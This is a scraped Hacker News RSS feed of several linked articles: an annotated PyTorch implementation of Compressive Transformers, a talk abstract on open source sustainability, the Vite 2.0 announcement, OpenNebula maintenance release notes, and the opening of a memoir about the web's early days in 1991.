February 19, 2021 | https://nn.labml.ai/transformers/compressive/index.html | <a href="https://web.archive.org/web/*/https://nn.labml.ai/transformers/compressive/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
    
    
    <div id="section-0">
        <div>
                
                
<p>This is an implementation of
<a href="https://arxiv.org/abs/1911.05507">Compressive Transformers for Long-Range Sequence Modelling</a>
in <a href="https://pytorch.org/">PyTorch</a>.</p>
<p>This is an extension of <a href="https://nn.labml.ai/transformers/xl/index.html">Transformer XL</a> where past memories
are compressed to give a longer attention range.
That is, the furthest $n_{cm} c$ memories are compressed into
$n_{cm}$ memories, where $c$ is the compression rate.</p>
<h2>Compression operation</h2>
<p>The compression operation is defined as
$f_c: \mathbb{R}^{nc \times d} \rightarrow \mathbb{R}^{n \times d}$.
The paper introduces multiple choices for $f_c$ and we have only implemented
1D convolution which seems to give the best results.
Each layer has a separate compression operation $f_c^{(i)}$ where
$i$ is the layer number.</p>
<h2>Training compression operation</h2>
<p>Since training compression with BPTT requires maintaining
a very large computational graph (many time steps), the paper proposes
an <em>auto-encoding loss</em> and an <em>attention reconstruction loss</em>.
The auto-encoding loss decodes the original memories from the compressed memories
and calculates the loss.
Attention reconstruction loss computes the multi-headed attention results
on the compressed memory and on uncompressed memory and gets a mean squared error
between them.
We have implemented the latter here since it gives better results.</p>
<p>This implementation uses pre-layer normalization
while the paper uses post-layer normalization.
Pre-layer norm does the layer norm before FFN[../feedforward.html) and
self-attention, and the pass-through in the residual connection is not normalized.
This is supposed to be more stable in standard transformer setups.</p>
<p>Here are <a href="https://nn.labml.ai/transformers/compressive/experiment.html">the training code</a> and a notebook for training a compressive transformer
model on the Tiny Shakespeare dataset.</p>
<p><a href="https://colab.research.google.com/github/lab-ml/nn/blob/master/labml_nn/transformers/compressive/experiment.ipynb"><img alt="Open In Colab" src="https://colab.research.google.com/assets/colab-badge.svg"></a>
<a href="https://web.lab-ml.com/run?uuid=0d9b5338726c11ebb7c80242ac1c0002"><img alt="View Run" src="https://img.shields.io/badge/labml-experiment-brightgreen"></a></p>
            </div>
            <div>
                <div><pre><span>54</span><span></span><span>from</span> <span>typing</span> <span>import</span> <span>Optional</span><span>,</span> <span>List</span>
<span>55</span>
<span>56</span><span>import</span> <span>torch</span>
<span>57</span><span>import</span> <span>torch.nn.functional</span> <span>as</span> <span>F</span>
<span>58</span><span>from</span> <span>torch</span> <span>import</span> <span>nn</span>
<span>59</span>
<span>60</span><span>from</span> <span>labml_helpers.module</span> <span>import</span> <span>Module</span><span>,</span> <span>TypedModuleList</span>
<span>61</span><span>from</span> <span>labml_nn.transformers.feed_forward</span> <span>import</span> <span>FeedForward</span>
<span>62</span><span>from</span> <span>labml_nn.transformers.mha</span> <span>import</span> <span>PrepareForMultiHeadAttention</span>
<span>63</span><span>from</span> <span>labml_nn.transformers.xl.relative_mha</span> <span>import</span> <span>RelativeMultiHeadAttention</span>
<span>64</span><span>from</span> <span>labml_nn.utils</span> <span>import</span> <span>clone_module_list</span></pre></div>
            </div>
        </div>
    <div id="section-1">
        <div>
                
                <h2>1D Convolution Compression $f_c$</h2>
<p>This is a simple wrapper around
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Conv1d.html"><code>nn.Conv1d</code></a>
with some tensor dimension permutations.</p>
            </div>
            <div>
                <div><pre><span>67</span><span>class</span> <span>Conv1dCompression</span><span>(</span><span>Module</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-2">
        <div>
                
                <ul>
<li><code>compression_rate</code> $c$</li>
<li><code>d_model</code> is the embedding size</li>
</ul>
            </div>
            <div>
                <div><pre><span>75</span>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>compression_rate</span><span>:</span> <span>int</span><span>,</span> <span>d_model</span><span>:</span> <span>int</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-3">
            
            <div>
                <div><pre><span>80</span>        <span>super</span><span>()</span><span>.</span><span>__init__</span><span>()</span>
<span>81</span>        <span>self</span><span>.</span><span>conv</span> <span>=</span> <span>nn</span><span>.</span><span>Conv1d</span><span>(</span><span>d_model</span><span>,</span> <span>d_model</span><span>,</span> <span>kernel_size</span><span>=</span><span>compression_rate</span><span>,</span> <span>stride</span><span>=</span><span>compression_rate</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-4">
        <div>
                
                <p><code>mem</code> has shape <code>[seq_len, batch, d_model]</code></p>
            </div>
            <div>
                <div><pre><span>83</span>    <span>def</span> <span>forward</span><span>(</span><span>self</span><span>,</span> <span>mem</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-5">
            <div>
                
                <p>Permute the dimensions of <code>mem</code> so that we can run it through the convolution layer.
The convolution layer accepts in the form <code>[batch, features, sequence]</code></p>
            </div>
            <div>
                <div><pre><span>90</span>        <span>mem</span> <span>=</span> <span>mem</span><span>.</span><span>permute</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>0</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-6">
            <div>
                
                <p>Get compressed memory by running it through the convolution layer</p>
            </div>
            <div>
                <div><pre><span>92</span>        <span>c_mem</span> <span>=</span> <span>self</span><span>.</span><span>conv</span><span>(</span><span>mem</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-7">
            <div>
                
                <p>Permute back to form <code>[seq_len, batch, d_model]</code></p>
            </div>
            <div>
                <div><pre><span>94</span>        <span>return</span> <span>c_mem</span><span>.</span><span>permute</span><span>(</span><span>2</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-8">
        <div>
                
                <h2>Compressive Transformer Layer</h2>
<p>This is the implementation of a single compressive transformer layer</p>
            </div>
            <div>
                <div><pre><span>97</span><span>class</span> <span>CompressiveTransformerLayer</span><span>(</span><span>Module</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-9">
        <div>
                
                <ul>
<li><code>d_model</code> is the token embedding size</li>
<li><code>self_attn</code> is the <a href="https://nn.labml.ai/transformers/xl/relative_mha.html">self attention module</a></li>
<li><code>feed_forward</code> is the <a href="https://nn.labml.ai/transformers/feed_forward.html">feed forward module</a></li>
<li><code>dropout_prob</code> is the probability of dropping out after self attention and FFN</li>
<li><code>compress</code> is the compression function $f_c$</li>
</ul>
            </div>
            <div>
                <div><pre><span>103</span>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>*</span><span>,</span>
<span>104</span>                 <span>d_model</span><span>:</span> <span>int</span><span>,</span>
<span>105</span>                 <span>self_attn</span><span>:</span> <span>RelativeMultiHeadAttention</span><span>,</span>
<span>106</span>                 <span>feed_forward</span><span>:</span> <span>FeedForward</span><span>,</span>
<span>107</span>                 <span>dropout_prob</span><span>:</span> <span>float</span><span>,</span>
<span>108</span>                 <span>compress</span><span>:</span> <span>Conv1dCompression</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-10">
            
            <div>
                <div><pre><span>116</span>        <span>super</span><span>()</span><span>.</span><span>__init__</span><span>()</span>
<span>117</span>        <span>self</span><span>.</span><span>compress</span> <span>=</span> <span>compress</span>
<span>118</span>        <span>self</span><span>.</span><span>size</span> <span>=</span> <span>d_model</span>
<span>119</span>        <span>self</span><span>.</span><span>self_attn</span> <span>=</span> <span>self_attn</span>
<span>120</span>        <span>self</span><span>.</span><span>feed_forward</span> <span>=</span> <span>feed_forward</span>
<span>121</span>        <span>self</span><span>.</span><span>dropout</span> <span>=</span> <span>nn</span><span>.</span><span>Dropout</span><span>(</span><span>dropout_prob</span><span>)</span>
<span>122</span>        <span>self</span><span>.</span><span>norm_self_attn</span> <span>=</span> <span>nn</span><span>.</span><span>LayerNorm</span><span>([</span><span>d_model</span><span>])</span>
<span>123</span>        <span>self</span><span>.</span><span>norm_ff</span> <span>=</span> <span>nn</span><span>.</span><span>LayerNorm</span><span>([</span><span>d_model</span><span>])</span></pre></div>
            </div>
        </div>
    <div id="section-11">
        <div>
                
                <p>Concatenate the normalized token embeddings with memory and compressed memory.</p>
<ul>
<li><code>z</code> is layer normalized token embeddings.</li>
<li><code>mem</code> and <code>c_mem</code> are memory and compressed memory (not normalized).</li>
</ul>
            </div>
            <div>
                <div><pre><span>125</span>    <span>def</span> <span>concat_memory</span><span>(</span><span>self</span><span>,</span> <span>z</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>,</span> <span>mem</span><span>:</span> <span>Optional</span><span>[</span><span>torch</span><span>.</span><span>Tensor</span><span>],</span> <span>c_mem</span><span>:</span> <span>Optional</span><span>[</span><span>torch</span><span>.</span><span>Tensor</span><span>]):</span></pre></div>
            </div>
        </div>
    <div id="section-12">
            <div>
                
                <p>If there is no memory just return the token embeddings</p>
            </div>
            <div>
                <div><pre><span>134</span>        <span>if</span> <span>mem</span> <span>is</span> <span>None</span><span>:</span>
<span>135</span>            <span>return</span> <span>z</span></pre></div>
            </div>
        </div>
    <div id="section-13">
            <div>
                
                <p>If there are compressed memory concatenate that with memory</p>
            </div>
            <div>
                <div><pre><span>138</span>        <span>if</span> <span>c_mem</span> <span>is</span> <span>not</span> <span>None</span><span>:</span>
<span>139</span>            <span>mem</span> <span>=</span> <span>torch</span><span>.</span><span>cat</span><span>((</span><span>c_mem</span><span>,</span> <span>mem</span><span>),</span> <span>dim</span><span>=</span><span>0</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-14">
            <div>
                
                <p>Run the memory through the normalization layer</p>
            </div>
            <div>
                <div><pre><span>142</span>        <span>mem</span> <span>=</span> <span>self</span><span>.</span><span>norm_self_attn</span><span>(</span><span>mem</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-15">
            <div>
                
                <p>Concatenate normalized memory and normalized token embeddings</p>
            </div>
            <div>
                <div><pre><span>144</span>        <span>return</span> <span>torch</span><span>.</span><span>cat</span><span>((</span><span>mem</span><span>,</span> <span>z</span><span>),</span> <span>dim</span><span>=</span><span>0</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-16">
        <div>
                
                <ul>
<li><code>x</code> is a tensor of token level feature vectors of shape <code>[seq_len, batch_size, d_model]</code></li>
<li><code>mem</code> is a tensor of the past token level feature vectors (memory) of shape <code>[mem_len, batch_size, d_model]</code></li>
<li><code>c_mem</code> is a tensor of the compressed memory <code>[c_mem_len, batch_size, d_model]</code></li>
<li><code>mask</code> is a matrix of shape <code>[seq_len, c_mem_len + mem_len + seq_len, batch_size]</code> or <code>[seq_len, c_mem_len + mem_len + seq_len, 1]</code>.
<code>mask[i, j]</code> is  true if token at <code>i</code> can see token at <code>j</code>.</li>
</ul>
            </div>
            <div>
                <div><pre><span>146</span>    <span>def</span> <span>forward</span><span>(</span><span>self</span><span>,</span> <span>*</span><span>,</span>
<span>147</span>                <span>x</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>,</span>
<span>148</span>                <span>mem</span><span>:</span> <span>Optional</span><span>[</span><span>torch</span><span>.</span><span>Tensor</span><span>],</span>
<span>149</span>                <span>c_mem</span><span>:</span> <span>Optional</span><span>[</span><span>torch</span><span>.</span><span>Tensor</span><span>],</span>
<span>150</span>                <span>mask</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-17">
            <div>
                
                <p>Normalize the vectors before doing self attention</p>
            </div>
            <div>
                <div><pre><span>160</span>        <span>z</span> <span>=</span> <span>self</span><span>.</span><span>norm_self_attn</span><span>(</span><span>x</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-18">
            <div>
                
                <p>Normalize and concatenate memory and compressed memory</p>
            </div>
            <div>
                <div><pre><span>162</span>        <span>m_z</span> <span>=</span> <span>self</span><span>.</span><span>concat_memory</span><span>(</span><span>z</span><span>,</span> <span>mem</span><span>,</span> <span>c_mem</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-19">
            
            <div>
                <div><pre><span>164</span>        <span>self_attn</span> <span>=</span> <span>self</span><span>.</span><span>self_attn</span><span>(</span><span>query</span><span>=</span><span>z</span><span>,</span> <span>key</span><span>=</span><span>m_z</span><span>,</span> <span>value</span><span>=</span><span>m_z</span><span>,</span> <span>mask</span><span>=</span><span>mask</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-20">
            <div>
                
                <p>Add the attention results</p>
            </div>
            <div>
                <div><pre><span>166</span>        <span>x</span> <span>=</span> <span>x</span> <span>+</span> <span>self</span><span>.</span><span>dropout</span><span>(</span><span>self_attn</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-21">
            <div>
                
                <p>Normalize for feed-forward</p>
            </div>
            
        </div>
    <div id="section-22">
            <div>
                
                <p>Pass through the feed-forward network</p>
            </div>
            <div>
                <div><pre><span>171</span>        <span>ff</span> <span>=</span> <span>self</span><span>.</span><span>feed_forward</span><span>(</span><span>z</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-23">
            <div>
                
                <p>Add the feed-forward results back</p>
            </div>
            <div>
                <div><pre><span>173</span>        <span>x</span> <span>=</span> <span>x</span> <span>+</span> <span>self</span><span>.</span><span>dropout</span><span>(</span><span>ff</span><span>)</span></pre></div>
            </div>
        </div>
    
    <div id="section-25">
        <div>
                
                <h2>Compressive Transformer Model</h2>
<p>This consists of multiple compressive transformer layers</p>
            </div>
            <div>
                <div><pre><span>179</span><span>class</span> <span>CompressiveTransformer</span><span>(</span><span>Module</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-26">
            
            <div>
                <div><pre><span>186</span>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>layer</span><span>:</span> <span>CompressiveTransformerLayer</span><span>,</span> <span>n_layers</span><span>:</span> <span>int</span><span>):</span>
<span>187</span>        <span>super</span><span>()</span><span>.</span><span>__init__</span><span>()</span></pre></div>
            </div>
        </div>
    <div id="section-27">
            <div>
                
                <p>Make copies of the transformer layer</p>
            </div>
            <div>
                <div><pre><span>189</span>        <span>self</span><span>.</span><span>layers</span> <span>=</span> <span>clone_module_list</span><span>(</span><span>layer</span><span>,</span> <span>n_layers</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-28">
            <div>
                
                <p>Final normalization layer</p>
            </div>
            <div>
                <div><pre><span>191</span>        <span>self</span><span>.</span><span>norm</span> <span>=</span> <span>nn</span><span>.</span><span>LayerNorm</span><span>([</span><span>layer</span><span>.</span><span>size</span><span>])</span></pre></div>
            </div>
        </div>
    <div id="section-29">
        <div>
                
                <ul>
<li><code>x</code> is a tensor of the token embeddings vectors of shape <code>[seq_len, batch_size, d_model]</code></li>
<li><code>mem</code> is a list of tensors of the past token level feature vectors of shape
 <code>[mem_len, batch_size, d_model]</code> for each layer</li>
<li><code>c_mem</code> is a list of tensors of the compressed memory
 <code>[c_mem_len, batch_size, d_model]</code> for each layer</li>
<li><code>mask</code> is the masking matrix</li>
</ul>
            </div>
            <div>
                <div><pre><span>193</span>    <span>def</span> <span>forward</span><span>(</span><span>self</span><span>,</span> <span>x</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>,</span> <span>mem</span><span>:</span> <span>List</span><span>[</span><span>torch</span><span>.</span><span>Tensor</span><span>],</span> <span>c_mem</span><span>:</span> <span>List</span><span>[</span><span>torch</span><span>.</span><span>Tensor</span><span>],</span> <span>mask</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-30">
            <div>
                
                <p>List to store token level feature vectors,
which will become the memories for the next sequential batch.</p>
            </div>
            
        </div>
    <div id="section-31">
        ‚Ä¶</div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nn.labml.ai/transformers/compressive/index.html">https://nn.labml.ai/transformers/compressive/index.html</a></em></p>]]>
            </description>
            <link>https://nn.labml.ai/transformers/compressive/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26192005</guid>
            <pubDate>Fri, 19 Feb 2021 11:34:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Towards a sustainable solution to open source sustainability]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26191853">thread link</a>) | @polm23
<br/>
February 19, 2021 | https://speaking.unlockopen.com/5JrQdv/towards-a-sustainable-solution-to-open-source-sustainability | <a href="https://web.archive.org/web/*/https://speaking.unlockopen.com/5JrQdv/towards-a-sustainable-solution-to-open-source-sustainability">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div id="desc">
        <p>A few years ago, Heartbleed epitomized a massive open source sustainability problem for critical parts of the internet infrastructure. The bug, which affected the popular OpenSSL cryptographic software library, notably compromised the confidentiality of 4.5 million US patient records and cost the industry an estimated $500M.</p>
<p>It was soon revealed that the root-cause of the issue was that OpenSSL was precariously understaffed. Open source sustainability became a major theme overnight. Stories of maintainer burn-out made the headlines. And tentative solutions started to emerge, most of them donation-based.</p>
<p>In this talk we‚Äôll explore a number of existing strategies to fund open source and make it more sustainable, from patronage to dedicated ad networks. And we‚Äôll defend the idea that the best path to open source sustainability is to help companies understand the tangible business value they can get from contributing to open source.</p>

    </div>
</div></div>]]>
            </description>
            <link>https://speaking.unlockopen.com/5JrQdv/towards-a-sustainable-solution-to-open-source-sustainability</link>
            <guid isPermaLink="false">hacker-news-small-sites-26191853</guid>
            <pubDate>Fri, 19 Feb 2021 11:14:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vite 2.0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26191819">thread link</a>) | @tga
<br/>
February 19, 2021 | https://vitejs.dev/blog/announcing-vite2.html | <a href="https://web.archive.org/web/*/https://vitejs.dev/blog/announcing-vite2.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-d36a7fda=""><div data-v-d36a7fda=""><p><img src="https://vitejs.dev/logo.svg"></p><p>Today we are excited to announce the official release of Vite 2.0!</p><p>Vite (French word for "fast", pronounced <code>/vit/</code>) is a new kind of build tool for frontend web development. Think a pre-configured dev server + bundler combo, but leaner and faster. It leverages browser's <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules" target="_blank" rel="noopener noreferrer">native ES modules</a> support and tools written in compile-to-native languages like <a href="https://esbuild.github.io/" target="_blank" rel="noopener noreferrer">esbuild</a> to deliver a snappy and modern development experience.</p><p>To get a sense of how fast Vite is, check out <a href="https://twitter.com/amasad/status/1355379680275128321" target="_blank" rel="noopener noreferrer">this video comparison</a> of booting up a React application on <a href="http://repl.it/" target="_blank" rel="noopener noreferrer">Repl.it</a> using Vite vs. <code>create-react-app</code> (CRA).</p><p>If you've never heard of Vite before and would love to learn more about it, check out <a href="https://vitejs.dev/guide/why.html" target="_blank" rel="noopener noreferrer">the rationale behind the project</a>. If you are interested in how Vite differs from other similar tools, check out the <a href="https://vitejs.dev/guide/comparisons.html" target="_blank" rel="noopener noreferrer">comparisons</a>.</p><h2 id="what-s-new-in-2-0"> What's New in 2.0</h2><p>Since we decided to completely refactor the internals before 1.0 got out of RC, this is in fact the first stable release of Vite. That said, Vite 2.0 brings about many big improvements over its previous incarnation:</p><h3 id="framework-agnostic-core"> Framework Agnostic Core</h3><p>The original idea of Vite started as a <a href="https://github.com/vuejs/vue-dev-server" target="_blank" rel="noopener noreferrer">hacky prototype that serves Vue single-file components over native ESM</a>. Vite 1 was a continuation of that idea with HMR implemented on top.</p><p>Vite 2.0 takes what we learned along the way and is redesigned from scratch with a more robust internal architecture. It is now completely framework agnostic, and all framework-specific support is delegated to plugins. There are now <a href="https://github.com/vitejs/vite/tree/main/packages/create-app" target="_blank" rel="noopener noreferrer">official templates for Vue, React, Preact, Lit Element</a>, and ongoing community efforts for Svelte integration.</p><h3 id="new-plugin-format-and-api"> New Plugin Format and API</h3><p>Inspired by <a href="https://github.com/preactjs/wmr" target="_blank" rel="noopener noreferrer">WMR</a>, the new plugin system extends Rollup's plugin interface and is <a href="https://vite-rollup-plugins.patak.dev/" target="_blank" rel="noopener noreferrer">compatible with many Rollup plugins</a> out of the box. Plugins can use Rollup-compatible hooks, with additional Vite-specific hooks and properties to adjust Vite-only behavior (e.g. differentiating dev vs. build or custom handling of HMR).</p><p>The <a href="https://vitejs.dev/guide/api-javascript.html" target="_blank" rel="noopener noreferrer">programmatic API</a> has also been greatly improved to facilitate higher level tools / frameworks built on top of Vite.</p><h3 id="esbuild-powered-dep-pre-bundling"> esbuild Powered Dep Pre-Bundling</h3><p>Since Vite is a native ESM dev server, it pre-bundles dependencies to reduce the number browser requests and handle CommonJS to ESM conversion. Previously Vite did this using Rollup, and in 2.0 it now uses <code>esbuild</code> which results in 10-100x faster dependency pre-bundling. As a reference, cold-booting a test app with heavy dependencies like React Meterial UI previously took 28 seconds on an M1-powered Macbook Pro and now takes ~1.5 seconds. Expect similar improvements if you are switching from a traditional bundler based setup.</p><h3 id="first-class-css-support"> First-class CSS Support</h3><p>Vite treats CSS as a first-class citizen of the module graph and supports the following out of the box:</p><ul><li><strong>Resolver enhancement</strong>: <code>@import</code> and <code>url()</code> paths in CSS are enhanced with Vite's resolver to respect aliases and npm dependencies.</li><li><strong>URL rebasing</strong>: <code>url()</code> paths are automatically rebased regardless of where the file is imported from.</li><li><strong>CSS code splitting</strong>: a code-split JS chunk also emits a corresponding CSS file, which is automatically loaded in parallel with the JS chunk when requested.</li></ul><h3 id="server-side-rendering-ssr-support"> Server-Side Rendering (SSR) Support</h3><p>Vite 2.0 ships with <a href="https://vitejs.dev/guide/ssr.html" target="_blank" rel="noopener noreferrer">experimental SSR support</a>. Vite provides APIs to to efficiently load and update ESM-based source code in Node.js during development (almost like server-side HMR), and automatically externalizes CommonJS-compatible dependencies to improve development and SSR build speed. The production server can be completely decoupled from Vite, and the same setup can be easily adapted to perform pre-rendering / SSG.</p><p>Vite SSR is provided as a low-level feature and we are expecting to see higher level frameworks leveraging it under the hood.</p><h3 id="opt-in-legacy-browser-support"> Opt-in Legacy Browser Support</h3><p>Vite targets modern browsers with native ESM support by default, but you can also opt-in to support legacy browers via the official <a href="https://github.com/vitejs/vite/tree/main/packages/plugin-legacy" target="_blank" rel="noopener noreferrer">@vitejs/plugin-legacy</a>. The plugin automatically generates dual modern/legacy bundles, and delivers the right bundle based on browser feature detection, ensuring more efficient code in modern browsers that support them.</p><h2 id="give-it-a-try"> Give it a Try!</h2><p>That was a lot of features, but getting started with Vite is simple! You can spin up a Vite-powered app literally in a minute, starting with the following command (make sure you have Node.js &gt;=12):</p><p>Then, check out <a href="https://vitejs.dev/guide/" target="_blank" rel="noopener noreferrer">the guide</a> to see what Vite provides out of the box. You can also check out the source code on <a href="https://github.com/vitejs/vite" target="_blank" rel="noopener noreferrer">GitHub</a>, follow updates on <a href="https://twitter.com/vite_js" target="_blank" rel="noopener noreferrer">Twitter</a>, or join discussions with other Vite users on our <a href="http://chat.vitejs.dev/" target="_blank" rel="noopener noreferrer">Discord chat server</a>.</p></div></div></div>]]>
            </description>
            <link>https://vitejs.dev/blog/announcing-vite2.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26191819</guid>
            <pubDate>Fri, 19 Feb 2021 11:09:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OpenNebula EE Maintenance Release 5.12.8 is available]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26191673">thread link</a>) | @amarti
<br/>
February 19, 2021 | https://opennebula.io/opennebula-enterprise-edition-maintenance-release-v-5-12-8-is-available/ | <a href="https://web.archive.org/web/*/https://opennebula.io/opennebula-enterprise-edition-maintenance-release-v-5-12-8-is-available/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			    <!-- .entry-header -->

				
					
<article id="post-30088">

    <!-- .entry-header -->

    <div>

		<p>The <strong>Enterprise Edition</strong> of OpenNebula is a tested, hardened, and production-ready version that incorporates additional bug fixes and software patches with minor enhancements developed by OpenNebula Systems.</p>
<p>While we make all our products open source under Apache License Version 2.0, the packages of the<strong> Enterprise Edition</strong> and the <strong>Enterprise Tools</strong> we‚Äôve created for Corporate Users are distributed under commercial license terms only to those customers with an active <a href="https://opennebula.io/subscriptions" target="_blank" rel="noopener noreferrer">OpenNebula Subscription</a>.</p>
<p>The following <strong>new features</strong> has been backported to 5.12.8:</p>
<ul>
<li>Add option to disable raw section validation.</li>
</ul>
<p>The following <strong>issues</strong> has been solved in 5.12.8:</p>
<ul>
<li>Fix RAFT Race condition when node fail to become leader.</li>
<li>Fix update service cardinality when terminating a VM.</li>
<li>Fix set VCPU range on Sunstone.</li>
<li>Fix OneGate context attributes when update VM template on Sunstone.</li>
<li>Fix update of the host zombie VM list.</li>
<li>Fix alias IPs in service role VM on Sunstone.</li>
<li>Fix option to edit VCENTER_PASSWORD from Sunstone.</li>
<li>Fix VM disk monitor for shared storage datastores.</li>
<li>Fix IPs dropdown on VMs datatable.</li>
<li>Fix monitoring IPs on Sunstone.</li>
</ul>
<p>If you are a customer with an active<strong> OpenNebula Subscription</strong>, you have immediate access to the packages for this EE Maintenance Release. Please <strong>check your private repository</strong> at the <a href="https://support.opennebula.pro/" target="_blank" rel="noopener noreferrer">OpenNebula Customer Portal</a>.</p>




		
		


        <div>
            <p><img alt="" src="https://secure.gravatar.com/avatar/a1737e9efc6920480d8a1abc8d21fd64?s=96&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/a1737e9efc6920480d8a1abc8d21fd64?s=192&amp;d=mm&amp;r=g 2x" height="96" width="96" loading="lazy">            </p>
            <div>
                <p><span id="autorblog">Michael Abdou</span></p><p>Customer Success Manager at OpenNebula</p>
            </div>
        </div>
	</div><!-- .entry-content -->

</article><!-- #post-## -->

					
<!-- #comments -->

				
			</div></div>]]>
            </description>
            <link>https://opennebula.io/opennebula-enterprise-edition-maintenance-release-v-5-12-8-is-available/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26191673</guid>
            <pubDate>Fri, 19 Feb 2021 10:49:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Out of the Matrix: Early Days of the Web]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26191562">thread link</a>) | @hacksilver
<br/>
February 19, 2021 | https://blog.yax.com/posts/early-days-of-the-web-1991/ | <a href="https://web.archive.org/web/*/https://blog.yax.com/posts/early-days-of-the-web-1991/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <div itemprop="articleBody">
                    
                    <hr> 
                    <p>The web is thirty years old, counting from the date the <a href="https://www.w3.org/2012/08/history-of-the-web/origins.htm">first web server was launched in December 1990</a>. I first saw it emerge on August 6th, 1991, when the web was publicly announced. But after 30 years, I think we‚Äôve lost sight of its original purpose. Here‚Äôs what I mean.</p>

<p>In 1991 I was writing for <em>NeXTWORLD</em> magazine, which was a lot of fun because I got to work with, and write about, people who were doing fascinating things with computer technology. Working for <em>NeXTWORLD</em> led to writing the book <em>Taking the Next Step</em> (with coauthor Seth Ross) and a short stint at Steve Jobs‚Äôs <a href="https://en.wikipedia.org/wiki/NeXT">NeXT</a> as a technical writer.</p>

<p>The most innovative project I encountered that year was not NeXT. Rather, it was something developed by <a href="https://en.wikipedia.org/wiki/Tim_Berners-Lee">Tim Berners-Lee</a>, a researcher at <a href="https://en.wikipedia.org/wiki/CERN">CERN</a>, the European particle physics laboratory. He used a NeXT computer to develop a networked information system for high-energy physicists. If I hadn‚Äôt been reading  the <em>comp.sys.next</em> Usenet newsgroups carefully, I would have missed the announcement of ‚Äúa hypertext editor for the NeXT.‚Äù</p>

<p>Not many people used ‚ÄúWWWNeXTStepEditor version 0.12.‚Äù The NeXT community was small, and many NeXT computer users did not yet have Internet access, which was required to access Tim Berners-Lee‚Äôs experimental ‚ÄúWorldWideWeb‚Äù documents. To me, the name WorldWideWeb seemed a bit of a conceit since the only users at the time were high-energy physicists at a few research institutes.</p>

<p>Nonetheless, as soon as I‚Äôd installed and tried the software, I wanted to get involved. I told everyone about it, including a fellow editor at <em>NeXTWORLD,</em> <a href="https://en.wikipedia.org/wiki/John_Perry_Barlow">John Perry Barlow</a>. Barlow, a lyricist for the Grateful Dead, and co-founder of the (then-new) Electronic Frontier Foundation, wrote to his friend <a href="https://en.wikipedia.org/wiki/Mitch_Kapor">Mitch Kapor</a> to say, here‚Äôs ‚ÄúSomething called World Wide Web, which sounds rather like Project Xanadu emerging from the Matrix almost without design. This could be cool.‚Äù</p>

<p><img src="https://blog.yax.com/images/post1-barlow.gif" alt=""></p>

<p>If you don‚Äôt recognize Barlow‚Äôs references, <a href="https://en.wikipedia.org/wiki/Project_Xanadu" title="Project Xanadu">Project Xanadu</a> was a visionary hypertext project that predated the Internet. The <a href="http://www.catb.org/~esr/jargon/html/M/Matrix.html">Matrix</a> is not the movie universe created by the Wachowskis but rather the totality of computer networks that existed before the commercialization of the Internet (as described by the researcher <a href="https://en.wikipedia.org/wiki/John_Quarterman">John Quarterman</a>).</p>

